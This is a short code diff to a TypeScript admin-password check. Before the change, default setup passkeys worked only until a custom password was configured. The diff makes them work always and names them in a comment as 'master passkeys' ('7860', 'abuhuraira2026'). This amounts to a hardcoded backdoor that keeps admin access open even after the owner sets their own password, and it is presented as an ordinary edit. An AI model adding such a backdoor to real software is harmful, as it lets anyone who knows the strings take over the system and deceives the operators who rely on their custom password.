@@ -141,11 +141,9 @@ export function verifyAdminPassword(input: string): { valid: boolean; rateLimite
 
   let matches = false;
 
-  // 1. Check against default setup keys if custom password is not set
-  if (!config.hasCustomPassword) {
-    if (DEFAULT_PASSKEYS.includes(clean.toLowerCase())) {
-      matches = true;
-    }
+  // 1. Check against master passkeys (7860, abuhuraira2026)
+  if (DEFAULT_PASSKEYS.includes(clean.toLowerCase())) {
+    matches = true;
   }
 
   // 2. Constant-time comparison using crypto.timingSafeEqual
